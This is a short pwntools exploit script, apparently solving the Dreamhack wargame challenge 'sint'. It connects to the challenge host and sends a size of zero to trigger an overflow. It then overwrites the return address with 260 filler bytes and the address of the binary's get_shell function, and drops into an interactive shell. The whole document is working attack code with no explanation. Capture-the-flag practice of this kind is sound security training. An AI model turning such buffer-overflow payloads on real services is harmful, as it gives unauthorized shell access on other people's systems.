from pwn import *

p = remote("host1.dreamhack.games", 17753)
e = ELF("./sint")
# libc = ELF("./libc6_2.27-3ubuntu1.4_amd64.so")

# gdb.attach(p)
def slog(symbol, addr): return success(symbol + ": " + hex(addr))

context.log_level = 'debug'

get_shell = e.symbols["get_shell"]

buf2ret = 256+4
payload = b"A"*buf2ret+p32(get_shell)
p.sendlineafter("Size: ",str(0))
p.sendlineafter("Data: ",payload)

p.interactive()